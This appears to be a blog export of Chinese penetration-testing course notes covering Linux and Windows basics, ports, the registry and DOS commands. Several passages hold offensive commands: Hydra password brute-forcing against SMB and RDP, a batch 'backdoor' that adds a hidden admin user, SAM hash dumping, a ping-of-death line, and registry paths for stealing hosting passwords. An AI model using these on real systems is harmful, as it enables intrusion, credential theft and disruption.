    <content type="text"><![CDATA[Linux系统目录结构: 文件系统(类似我的电脑)-&gt;有很多目录 bin(存放普通用户可以运行的命令) sbin(存放只有管理员用户才能执行的命令) boot(存放linux操作系统引导的配置文件) dev(存放存储文件,包括硬盘) etc(存放系统和应用的配置文件) home(存放普通用户的家目录) lib(存放函数库文件) lost+found(一个分区挂在这) media/mnt(存放挂载光盘,一些外来介质) opt(安装外围的大型程序) proc(随着开机生成的进程信息) root(超级用户的目录) selinux(对程序进行控制的) srv() sys(存放系统配置文件的) tmp(临时文件) usr(安装一些外部程序usr/local,usr/src) var(日志,安装apache根目录等) 树形目录结构 最顶层:根目录 命令行提示符&quot;#&quot;代表root登录的时候就是# RHEL6中默认安装的桌面环境是:(Jnomo?)桌面(一般不耗费较多资源),KDE桌面 从字符界面切换到图形界面: Ctrl+Alt+F2-&gt;进入字符界面 ,需要登录 可以开:F2-F7都是字符界面 Ctrl+Alt+F1-&gt;进入图形化界面 (新手上手红帽,再kali) Linux常用命令: Linux命令: 用于实现某一类功能的指令或程序 命令的执行依赖于解释器程序(reg:/bin/bash) Linux命令的分类: (内部自带的命令) 内部命令:属于Shell解释器的一部分 (安装程序之后的命令) 外部命令:独立于Shell解释器之外的程序文件. linux命令行格式2-1 通用命令格式: 命令字 [选项] [参数] 选项及参数含义 选项:用于调节命令的具体功能 以&quot;-&quot;引导短格式选项(单个字符),例如&quot;-l&quot; 以&quot;--&quot;引导长格式选项(多个字符),例如&quot;--color&quot; 多个短格式选项可以写在一起,只用一个&quot;-&quot;引导,例如&quot;-al&quot; 参数:命令操作的对象,如文件,目录名等. [root@localhost~]#ls -l /home 总计8 drwx------2 benet benet 4096 09-08 08:50 benet linux命令行格式2-2 命令行编辑的几个辅助操作 Tab键:自动补齐 反斜杠&quot;\&quot;:强制换行 Ctrl+U:清空至行首 Ctrl+K:清空至行尾 Ctrl+L:清屏 Ctrl+C:取消本次命令编辑 -&gt;SecureCRT -&gt;创建会话new Session Wizard-&gt;SSH2(相当于win下的charnet) -&gt;ip,port,password -&gt;Accept&amp;Save -&gt;进入编辑 获得命令帮助 内部命令help 查看Bash内部命令的帮助信息 命令的&quot;--help&quot;选项 适用于大多数外部命令 使用man命令阅读手册页 使用&quot;↑&quot;,&quot;↓&quot;方向键滚动文本 使用Page Up和Page Down键翻页 按Q或q键退出阅读环境,按&quot;/&quot;键后查找内容 查看系统内核信息--uname uname命令: 查看系统相关信息 常用命令选项: -a:显示主机名,内核版本,硬件平台等详细信息 -r:显示内核版本 reg: [root@localhost~]# uname -r 2.6.18-194.el5 # which uname --查看路径 查看系统主机名--hostname hostname命令: 查看主机的完整名称 包括主机名称,所在域的名称 reg: [root@localhost~]# hostname localhost.localdomain 查看IP--ifconfig # ifconfig --查看全部ip # ifconfig eth0 --查看自己的ip 查看系统CPU信息/内存信息 查看CPU信息 /proc/cpuinfo [root@localhost~]# cat /proc/cpuinfo processor :0 vendor_id :GenuineIntel cpu family :6 model :23 model name :Intel(R) Celeron(R) CPU E3200 @ 2.40GHz stepping :1.0 cpu MHz :2394.029 cache size :1024KB ... 查看内存信息 /proc/meminfo [root@localhost~]# cat /proc/meminfo 关机及重启操作 关机操作 shutdown,poweroff [root@localhost~]# shutdown -h now [root@localhost~]# poweroff [root@localhost~]# halt 重启操作 shutdown,reboot [root@localhost~]# shutdown -r now [root@localhost~]# reboot 查看及切换目录 pwd命令 用途:查看工作目录(Print Working Directory) cd命令 用途:切换工作目录(Change Directory) 格式:cd [目录位置] [root@localhost~]# cd /etc/httpd --绝对路径 [root@localhost httpd]# cd/conf --相对路径 [root@localhost conf]# cd~benet --相对路径 [root@localhost benet]# pwd /home/benet [root@localhost zhangsan]# ls -dl../jerry --相对路径 drwx-----2 jerry jerry 4096 09-14 2150 ../jerry 目录操作命令-ls ls命令 用途:列表(List)显示目录内容 格式:ls [选项]... [目录或文件名] -l:以长格式显示 -a:显示所有子目录和文件的信息,包括隐藏文件 -A:类似于&quot;-a&quot;,但不显示&quot;.&quot;和&quot;..&quot;目录的信息 -h:以更易读的字节单位(K,M等)显示信息 -R:递归显示内容 --color:以颜色区分不同类型文件 ls -l: /*-rwxr-xr-x.*/权限(读,写,可执行) 1 /*root*/创建人 /*root*/所在分组 /*73*/大小B /*9月 17 2015*/创建日期 /*ifcfg-eth0*/文件名 -rwx:代表所有者权限 r-x(中间):代表组对其的权限 r-x(后面):代表其他人权限 第一个如果是&quot;l&quot;,就代表是链接,x:可执行 目录操作命令--du du命令: 用途:统计目录及文件的空间占用情况(estimate space usage) 格式:du [选项]... [目录或文件名] 常用命令选项: -a:统计时包括所有的文件,而不仅仅只统计目录 -h:以更易读的字节单位(K,M等)显示信息 -s:只统计每个参数所占用空间总的大小 [root@localhost~]# du -sh /home 72K /home 创建目录命令--mkdir mkdir命令: 用途:创建新的目录(Make Directory) 格式:mkdir [-p] [/路径/]目录名 [root@localhost~]# mkdir -p /multimedia/movie/cartoon [root@localhost~]# ls -R /multimedia /multimedia: movie /multimedia/movie: cartoon /multimedia/movie/cartoon: 创建文件命令--touch touch命令: 用途:新建空文件,或更新文件时间标记 格式:touch 文件名... [root@localhost~]# cd /multimedia/movie/cartoon [root@localhost cartoon~]# touch HuaMulan.rmvb NeZhaNaoHai.mp4 [root@localhost cartoon]# ls -lh 总计 0 -rw-r--r-- 1 root root 0 02-11 21:44 HuaMulan.rmvb -rw-r--r-- 1 root root 0 02-11 21:44 NeZhaNaoHai.mp4 创建连接文件--ln ln命令: 用途:为文件或目录建立链接(Link) 格式:ln [-s] 源文件或目录... 链接文件或目标目录 常用命令选项: -s:建立符号链接文件(省略此项则建立硬链接)(快捷方式) [root@localhost~]# ln -s /etc/httpd/conf/httpd.conf /etc/ [root@localhost~]# ls -lh /etc/httpd.conf lrwxrwxrwx 1 root root 26 05-02 01:54 /etc/httpd.conf -&gt; /etc/httpd/conf/httpd.conf [root@localhost~]# ln /usr/sbin/system-config-network /sbin/netconfig [root@localhost~]# ls -lh /sbin/mynetconfig -rwxr-xr-x 2 root root 188 2007-01-08 /sbin/mynetconfig ---cat:查看文件 复制文件或目录--cp cp命令: 用途:复制文件或目录 格式:cp [选项]... 源文件或目录... 目标文件或目录 常用命令选项: -r:递归复制整个目录树 -p:保持源文件的属性不变 -f:强制覆盖目录同名文件或目录 -i:需要覆盖文件或目录时进行提醒 [root@localhost~]# cp -r /boot/grub/ /etc/host.conf public_html/ 删除文件或目录---rm rm命令 用途:删除文件或目录 格式:rm [选项]... 文件或目录 常用命令选项: -f:强行删除文件或目录,不进行提醒 -i:删除文件或目录时提醒用户确认 -r:递归删除 [root@localhost~]# rm -rf public_html/grub/ 移动文件或目录----mv mv命令: 用途:移动文件或目录 --若如果目标位置与源位置相同,则相当于改名 格式:mv [选项]... 源文件或目录... 目标文件或目录 [root@localhost~]# mv mytouch mkfile [root@localhost~]# ls -lh mytouch mkfile ls:mytouch:没有那个文件或目录 -rwxr-xr-x 1 root root ... mkfile reg: mv cracer /seven/ 移动到seven下 如果在同一目录下 mv cracer seven 就是改名为seven 查找文件或目录---find find命令 用途:用于查找文件或目录 格式:find [查找范围] [查找条件] 常用查找条件: -name:按文件名查找 -size:按文件大小查找 -user:按文件属主查找 -type:按文件类型查找 [root@localhost~]# find /etc -name &quot;resol*.conf&quot; /etc/resolv.conf /etc/sysconfig/networking/profiles/default/resolv.conf reg: find / -name cracer 进入vi: vi是一个较大的unix命令,在启动的时候也有它自己的选项和参数 基本语法: vi [-options] [+[n]] [file] 常用选项有:-r , -R -r用于恢复系统突然崩溃时正在编辑的文件 -R用于以只读方式打开文件 +n用来指明进入vi后直接位于文件的第n行,如果不指定n,则位于最后一行]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记03-06(4)-IIS安装与linux安装]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-4-IIS%E5%AE%89%E8%A3%85%E4%B8%8Elinux%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[IIS安装多个网站 1.多IP 2.同IP多端口 3.域名 cmd-&gt;ncpa.cpl 绑定域名就不能用IP访问,只能用域名访问,如果你没有定义DNS解析域名的话,就访问不到. IIS-&gt;添加-&gt;自定义-&gt;DNS服务器. 开始-&gt;管理-&gt;DNS-&gt;baidu.com 选中-&gt;右侧右键-&gt;新建主机-&gt;www,IP 本地连接-&gt;IPv4-&gt;下方DNS输入 IIS-&gt;主目录-&gt;纯脚本......(看其他笔记) TODO------------27min之前没看完 linux: linux没有盘符,全是文件夹的形式. 1.linux系统的介绍,安装,密码的破解 2.linux系统目录结构,常用命令 3.linux系统网络配置 linux系统的介绍: 操作系统:有ibm-&gt;unix(比较昂贵) Unix是由美国电话电报公司(AT&amp;T)贝尔实验室两个工程师所创造的操作系统,它 允许计算机同时处理多用户和程序.价钱昂贵,性能和稳定性比较好. 目前大型政府单位,大型企业,航空公司,金融机构都在使用. Unix和硬件配套卖的. linux:可以运行在PC机上类似于Unix风格的操作系统,由众多程序员通过Internet协作开发. (Open Source) 自由软件(Free Software)定义是自由的软件而不是免费的软件. 使用自由,研究自由,散布自由,改良自由 Linus Torvalds,芬兰人,芬兰吉祥物:企鹅 linux系统结构: 由内核及应用程序组成. 不同的厂商根据各自的需要将各种应用软件和Linux内核一起打包即成为一个Linux发行版本 发行版本(distribution) Linux常见的发行版本: RedHat Linux(常见) SuSE Linux(安全性高,比较卡) Ubuntu Linux Mandrake Linux Caldera Linux Turbolinux Linux Debian GNU/Linux(适用个人用户) Gentoo Linux Linpus Linux 优点: 1.免费,收费是维护的时候 2..... 更佳的性能2-1 CentOS 5.3 vs Windows Server 2003 Apache Tomcat Jboss 静态页面访问性能比较 硬件平台:CPU Xeon2.0x4,内存4GB 更佳的性能2-2 磁盘IO性能测试 将小文件从硬盘拷到硬盘(603MB)(12文件夹2154个文件) 安全性更好: 病毒,木马相对少 高性能计算机: 基本都在用Linux 新浪 Google QQ NEC,摩托罗拉,诺基亚,三星都有Linux手机 亚马逊 SONY的PS2游戏机 中国国家邮政局 德国慕尼黑 美国天气预报 如何学习linux: 1.从命令开始打基础 2.选一本好书 3.养成在命令行下工作的习惯 4.学习shell命令解释器 5.实践 6.学会使用文档 7.在Linux论坛获取帮助 8.学习专业英文 4.ISCE 安装: 内核版本2-1 提权,版本号,找相应的漏洞 XX.YY.ZZ YY:主版本号 ZZ:次版本号 reg: 2.5.7 奇数表示开发板本 2.6.18 偶数表示稳定版本 稳定版本2.4.6-&gt;2.4.7-&gt;修复BUG-&gt;2.4.8-&gt;2.4..... 开发版本2.5.7-&gt;2.5..-&gt;增加新功能-&gt;2.5.77 -&gt;拷贝-&gt;稳定版本2.6.1-&gt;2.6.... 磁盘分区表示: Linux中将硬盘,分区等设备均表示为文件. /dev/hda5 dev:硬件设备文件所在的目录 hd:表示IDE设备(hd的硬盘); sd:表示SCSI设备; a:硬盘的顺序号,以字母a,b,c...表示 代表第几块硬盘 5:分区的顺序号,以数字1,2,3...表示 代表第几个分区 这里,前4个是主分区,5代表第1个逻辑分区 第1个主分区:/dev/hda1 第2个主分区:/dev/hda2 第1块SCSI硬盘设备/dev/sda 第1个逻辑分区/dev/hda5 第2个逻辑分区/dev/hda6 扩展分区 文件系统类型: Linux中默认使用的文件系统类型: EXT4,第3代扩展(Extended)文件系统 SWAP,交换文件系统(相当于win的虚拟内存,reg:如果是2G,则分win的2048-4096内存(1-2倍)) Linux支持的其它文件系统类型 FAT16,FAT32,NTFS(Win用的多) XFS,JFS ... RHEL6-&gt;红帽6: 默认是EXT4 安装RHEL6系统: 安装步骤: 1.引导 设置主机引导设备为光盘驱动器 从光盘启动主机 2.检测安装光盘的完整性 3.配置安装程序 选择安装过程显示语言,键盘类型,初始化磁盘,分区 设置网络地址,系统时区,管理员口令 定制要安装的软件包 4.复制文件并完成安装过程 初始化RHEL系统: 用户许可协议 网络防火墙配置 SELinux配置 Kdump配置 系统日期和时间的设置 设置软件更新 添加系统用户 声卡测试 安装附加光盘 VM-&gt;RHEL6 32-&gt;20G CD-&gt;rhel-server-6.2-i386-dvd.iso 1.安装/升级系统 2.安装系统使用基本驱动 3.救援系统(选1就行) -&gt;skip-&gt;next-&gt;Chinese-&gt;美国式英语-&gt;是,丢弃所有设备 -&gt;Create Custom Layout(自定义创建分区)-&gt;sda-&gt;空闲-&gt;创建 -&gt;标准分区-&gt;创建-&gt;挂载点:/boot(挂载引导配置信息的地方) -&gt;文件大小200M-&gt;确定 -&gt;空闲-&gt;创建-&gt;文件系统类型-&gt;swap-&gt;大小2048MB -&gt;空闲-&gt;创建-&gt;挂载点:/-&gt;勾选使用全部可用空间-&gt;确定 -&gt;下一步-&gt;格式化-&gt;write *如果是U盘安装的时候,必须把/dev/sda改成/dev/sdb -&gt;下一步-&gt;最小-&gt;勾选现在定制-&gt;下一步 -&gt;桌面-&gt;X窗口系统,图形管理工具,字体,桌面,输入法 开发-&gt;勾选开发工具;语言支持-&gt;中文支持-&gt;下一步]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记03-06(3)-hydra与netstat]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-3-hydra%E4%B8%8Enetstat%2F</url>
    <content type="text"><![CDATA[hydra: 一般可以爆破ssh密码 爆破https # hydra -m /index.php -l username -P pass.txt IP https 爆破teamspeak 爆破cisco 破解smb # hydra -l administrator -P pass.txt IP smb 破解pop3 破解rdp # hydra IP rdp -l administrator -P pass.txt -V -&gt; 映射盘符 -&gt; 留后门.bat copy con c:\123.bat net user cracer 123 /add net localgroup administrators cracer /add shutdown -s -t 1800 -c &quot;hacked by cracer&quot; ctrl+z netstat -an --查看端口,及连接情况 attrib 文件名(目录名) 查看某文件(目录)的属性 attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的存档,只读,系统,隐藏属性;用+则是添加为某属性.]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记03-06(2)-系统日志与端口与注册表]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-2-%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%E4%B8%8E%E7%AB%AF%E5%8F%A3%E4%B8%8E%E6%B3%A8%E5%86%8C%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[系统日志信息: perflogs: 管理-&gt;系统工具-&gt;事件查看器-&gt;windows日志-&gt;setup 服务:services.msc 是一种应用程序类型,在后台运行.服务应用程序通常可以在本地和通过网络为用户提供一些功能. 作用: 服务决定了计算机的一些功能是否被启用 不同的 服务对应的功能不同 通过计算机提供的服务可以有效实现资源共享 常见的服务: web,dns,dhcp,邮件,telnet,ssh,ftp,smb 访问共享: (期间可以设置权限) cmd-&gt;\\192.168.80.137 端口:(port) 可以认为是计算机与外界通讯交流的出口.按端口号可分为3大类: 公认端口(Well Known Ports);注册端口(Registered Ports);动态和/私有端口(Dynamic and/or Private Ports) 一台拥有IP地址的主机可以提供许多服务,用&quot;IP地址+端口号&quot;来区分不同的服务的 端口并不是一一对应的. 知名端口():0-1023 动态端口:1024-65535 动态端口常被木马利用,如冰河默认连7626,WAY 连8011,Netspy 7306,YAI是1024 端口按协议分为TCP,UDP和ICMP(Internet控制消息协议) TCP端口:传输控制协议端口,需要在客户端和服务端之间建立连接.reg:有21,23,25,80 UDP端口:用户数据包协议段可可,无需在客户端和服务器之间建立连接.reg:有53,161,80000和40000 常见的端口: HTTP协议代理服务器常用端口号:80/8080/3128/8081/9080 FTP(文件传输)协议代理服务器常用端口号:21 Telnet(远程登录)协议代理服务器常用端口:23 TFTP,默认端口69/udp; SSH,SCP,端口重定向,默认为22/TCP; SMTP,25/TCP; POP3:110/TCP; TOMCAT:8080; WIN2003远程登录:3389; QQ:1080/UDP; &lt;-- 资料: win2003经典套装-戴有炜 端口服务对照表 黑客命令行攻防实战详解.至诚文化.扫... --&gt; 黑客通过端口进行: 信息搜集; 目标探测; 服务判断; 系统判断; 系统角色分析; 注册表:(Registry)(windows称之为登录档) 是windows中的一个重要的数据库,用于存储系统和应用程序的设置信息. 存放各种参数,直接控制着windows的启动,硬件驱动程序的装载以及一些windows应用程序的运行. 比如注册表中保存有应用程序和资源管理器外壳的初始条件,首选项和卸载数据等.联网计算机的 整个系统的设置和各种许可,文件扩展名与应用程序的关联,硬件部件的描述,状态和属性.性能记录 和其他底层的系统状态信息,以及其他数据等. cmd-&gt;regedit (安装后门-&gt;通过注册表)(可以改桌面,基本什么都可以) 1.HKEY_CLASSES_ROOT 管理文件系统.根据在Windows中按照的应用程序的扩展名,该根键指明其文件类型的名称,相应打开 该文件所要调用的程序等等信息. 2.HKEY_CURRENT_USER 管理系统当前的用户信息.在这个根键中保存了本地计算机中存放的当前登录的用户信息,包括用户登录用户名和暂存的密码.在 用户登录windwos98时,其信息从HKEY_USERS中相应拷贝到HKEY_CURRENT_USER中. 3.HKEY_LOCAL_MACHINE(提权中经常用) 管理当前系统硬件配置.在这个根键中保存了本地计算机硬件配置数据,此根键下的子关键字包括 在SYSTEM.DAT中,用来提供HKEY_LOCAL_MACHINE所需的信息,或者在远程计算机中可访问的一组键中. 这个根键里面的许多子键与System.ini文件中设置项类似. 4.HKEY_USERS 管理系统的用户信息.在这个根键中保存了存放在本地计算机口令列表中的用户标识和密码列表. 同时每个用户的预配置信息都存储在HKEY_USERS根键中.HKEY_USERS是远程计算机中访问的根键之一. 5.HKEY_CURRENT_CONFIG 管理当前用户的系统配置.在这个根键中保存着定义当前用户桌面配置(如显示器等等)的数据,该用户 使用过得文档列表(MRU),应用程序配置和其他有关当前用户的windwos98中文版的安装的信息. 不少计算机系统感染了网络病毒后,可能会在这些注册表中做修改: HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\RunOnce HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\Run HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\RunServices (1)IE起始页的修改 HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main 的右半部分窗口中的Start Page就是IE主页地址了. (2)Internet选项按钮灰化&amp;失效 HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel 下的DWORD值&quot;Setting&quot;=dword:1 &quot;Links&quot;=dword:1 &quot;SecAddSites&quot; dword:1全部改为0之后 再将 HKEY_USERS\DEFAULT\Software\Policies\Microsoft\Internet Explorer\Control Panel下 的DWORD值&quot;homepage&quot;键值改为0,则无法使用&quot;Internet选项&quot;修改IE设置 (3)&quot;源文件&quot;项不可用 HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Restrictions 的&quot;NoViewSource&quot;被设置为1了,改为0就可以恢复正常. (4)&quot;运行&quot;按钮被取消&amp;失效 HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\Policies\Explorer 的&quot;NoRun&quot;键值被改为1了,改为0就可以恢复. (5)&quot;关机&quot;按钮被取消&amp;失效 HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\Policies\Explorer 的&quot;NoClose&quot;键值被改为1了,改为0就可以恢复 (6)&quot;注销&quot;按钮被取消&amp;失效 HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\Policies\Explorer 的&quot;NoLogOff&quot;键值被改为1了,改为0就可恢复 (7)磁盘驱动器被隐藏 HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\Policies\Explorer 的&quot;NoDrives&quot;键值被改为1了,改为0就可恢复. 入侵中常用的注册表: HKEY_LOCAL_MACHINE\software\hzhost\config\settings\mysqlpass HKEY_LOCAL_MACHINE\software\hzhost\config\settings\mssqlpss HKEY_LOCAL_MACHINE\software\hzhost\config\settings\mastersvrpass HKEY_LOCAL_MACHINE\SYSTEM\LIWEIWENSOFT\INSTALLFREEADMIN\11 HKEY_LOCAL_MACHINE\SYSTEM\LIWEIWENSOFT\INSTALLFreeHost\11 &lt;-- www.cracer.com/?post=374 --&gt; DOS: ping -t -l 65500 ip死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping) TTL=53 低于68的是linux,win7,08,NT6.0的内核 每经过一个路由器,就会-1 TTL=128 XP,03 systeminfo: 复制补丁,和提权补丁对比. arp -a 查看所有局域网里的计算机 xxx.xx.xx.网关ip ren 原文件名 新文件名 重命名文件名 net share ipc$ 开启ipc$共享 net share ipc$ /del 删除ipc$共享 net share c$ /del 删除C:共享 内网渗透测试: Hydra破解密码]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记03-06(1)-网站搭建与http头]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-1-%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E4%B8%8Ehttp%E5%A4%B4%2F</url>
    <content type="text"><![CDATA[网站篇 http头讲解: HTTP/1.1 HTTP版本号 200 响应码 动态网站: 指网站内容可根据不同情况动态变更的网站,一般情况下动态往后在哪通过数据库进行架构. 百度-&gt;inur:asp?id= 网址/robots.txt 是否是伪静态,自己改网址. .html-&gt; .php?id=xxx 测试是否有注入 and 1=1 --%20 ,即查到黑客入侵 网站搭建: 1.windows+iis+asp+access 2.windows+iis+asp+mssql 3.windows+asp小旋风+asp+access 1.windows+apmserv+php+mysql 2.windows+tomcat+jsp+mysql 3.linux+apche+php+mysql]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记02-windows讲解]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002-windows%E8%AE%B2%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[`系统目录,服务,端口,注册表 系统目录: windows program files 用户 perflogs -&gt; perfLogs是windows7的日志信息 ProgramData-&gt;(一般木马喜欢感染这些)(存放应用程序的临时配置文件,会随着应用启动生成一些配置文件) 杀软一般不杀ProgramData这个目录. 64位指cpu (x86)指如果默认是32位就默认安装在x86下面 Temp:临时文件 Windows-&gt;System32-&gt;config-&gt;SAM 用PE不进系统,去开SAM-&gt;lc5破解/彩虹表 有权限的话对SAM进行读取哈希值,然后就可以破解 pe可以改SAM明文,但是不能读 (权限提升-&gt;getpass)(可以读明文,可以读哈希) cmd-&gt;net user administrator 123.com 抓哈希: cmd-&gt;PwDump7.exe(pw7)-&gt;密文:500是UID号,windows是500,linux是0第一行第二段是密文 明文:(能读出来就是要管理权限) Windows-&gt;System32-&gt;drivers-&gt;etc-&gt;hosts DNS服务器: 数据包-&gt;指定DNS服务器-&gt;DNS服务器查询域名对应的IP-&gt;百度 (hosts优先级要高于DNS服务器)(reg:ping www.baidu.com) (hosts-&gt;最后写上1.1.1.1 www.baidu.com 进行测试) -&gt;附:DNS: DNS(Domain Name Server,域名服务器)是进行域名(domain name)和与之相对应的IP地址(IP address)转换的服务器. DNS是计算机域名系统 (Domain Name System 或Domain Name Service) 的缩写，它是由域名解析器和域名服务器组成的。域名服务器是指保存有 该网络中所有主机的域名和对应IP地址，并具有将域名转换为IP地址功能的服务器。 DNS服务器在域名解析过程中的查询顺序为：本地缓存记录、区域记录、转发域名服务器、根域名服务器。 用户-&gt;用户名-&gt; (对内网进行渗透的话要用这个)(不用登陆该电脑账号来通过权限查询桌面信息) 服务: 定义计算机开了哪些功能, services.msc metasploit,msf-&gt;kali安装后门 pentestbox-&gt;将kali工具封装打包放在win下 常见的服务: web服务,dns服务,dhcp服务,邮件服务,telent服务,ssh服务,ftp服务,smb服务 web服务:搭建网站的 dhcp服务:给客户机分发可用ip telnet服务:远程连接. cmd-&gt;netstat -an 端口是23. (远程端口) win7打开windos功能安装telnet客户端. 远程登录过去之后,ipconfig就显示的是远程端的IP 爆破密码:(网速,性能,成功率很少)(一般对该人进行信息搜集来增加几率) CPU集成电路板,集成很多CPU,来进行爆破 GPU显卡爆破 密码攻击-&gt;hydra-8.1-win 字典文件-&gt;pass.txt(演示用自己生成) 太长的话就改文件夹名-&gt;hy cmd-&gt;hydra.exe -l administrator -P pass.txt 192.168.3.100 telnet 服务端口:(1-65535) 1-1024:预保留端口,已经占用了,一般设置8000之后的 80:www(web) 21:ftp 25:smtp 20:也算ftp 53:dns 67,68:dhcp 69:tftp 43:https 45:smb(共享服务) 3306:mysql 1433:sqlserver 1521:oracle 23:telnet 22:ssh 25:smtp 110:pop3 -------------- :vnc 8021:filze 43958:serveru 3389:rdp(远程桌面) 黑客通过端口可以: 信息搜集,目标探测,服务判断,系统判断,系统角色分析 系统判断-&gt;linux 22. telnet被窃取的话会被发现,ssh是有加密的 nmap-O 192.168.3.100(端口扫描之王)-&gt;探测版本 系统角色分析:80,21-&gt;做网站的虚拟子机(阿里云就是这么干的,比较安全) ping www.cracer.com (阿里云,创宇安全性好一点) 注册表: 5个跟键-&gt;子键 是windows操作系统的核心数据库. 默认浏览器有时候也要修改注册表 木马3个部分看: 1.regedit 2.msconfig-&gt;启动 C:-&gt;programData-&gt;Microsoft-&gt;Windows-&gt;开始菜单-&gt;程序-&gt;启动 删除/记事本清空它 3.通过网络来查 cmd netstat -n (检测到的,一般是动态域名,或者用的其他的电脑ip) `DOS命令 一般在提权的时候用 color /? ping -t -| ipconfig /release释放IP /renew重新获取IP /all systeminfo --获取系统详细信息(最主要是判断有没有安装补丁)(漏洞没有打补丁的话就可以直接提权) arp -a --获取当前局域网中有哪些主机的ip的 只能判断最近一次缓存表里存在的主机,每5分钟返回一次 net view --获取局域网有哪些主机名 shutdown -s -t 180 -c &quot;hello&quot; shutdown -a msg --系统命令弹框 mas hackerhost &quot;hello hackerxxx&quot; dir --dir c: cd start --start www.baidu.com --路径&gt;start pass.txt --路径&gt;notepad pass.txt copy --copy pass.txt C:\ del --del c:\pass.txt md --创建目录 md xiaomulu rd --删除目录 rd xiaomulu /* 创建 copy con 123.txt 创建123.txt hello cracer xxxx xxxxx 最后按 ctrl+z回车 保存. */ type 123.txt --在命令行中打开 cat 123.txt --linux里面的命令 move 123.txt hy --移动 后面跟的移到哪 tree --查看文件 net use K: \\192.168.3.100\c$ 回车 --盘符映射 administrator 123456 就会在本地创建一个K盘 (开防火墙,就会拦截) ncpa.cpl --本地连接 net use K: /del --删除映射 net start telnet --开启telnet服务(必须不是禁用的) net stop telnet --关闭 net user --查看user net user xiao 123 /add --添加xiao用户 net localgroup administrators xiao /add --提升权限 net localgroups --查看本地有哪些组 Remote Desktop Users --远程桌面用户组 如果有安装了安全狗,能创建用户但是不能加到管理员组,但是可以加入到远程桌面组,这里还是普通用户 然后,将文件都降权处理.(有杀狗神器) net localgroup &quot;remote desktop users&quot; xiao /add net user Guest net user guest /active:yes --启用 net user guest 123456 net localgroup administrators guest /add net user xiao 123 /ad --也可以创建用户,现在也绕不过360了 netstat --查看端口 tasklist --查看进程 taskkill /im cmd.exe --结束进程 netsh --网络管理的接口 netsh wlan set hostednetwork mode=allow ssid=cc key=123456 netsh wlan start hosted --加载wlan at --设置计划任务/查看计划 at 22:51 shutdown -s -t 1800 attrib 批处理:bat(很多dos命令放在一个里面) copy con x.bat net user cr 123.com /add net localgroup administrators cr /add shutdown -s -t -c &quot;hello hacked by cr .you are hacking...&quot; ctrl+z 回车 任务: 1.熟记服务对应端口 2.常用dos命令]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记01-基础讲解]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001-%E5%9F%BA%E7%A1%80%E8%AE%B2%E8%A7%A3%2F</url>
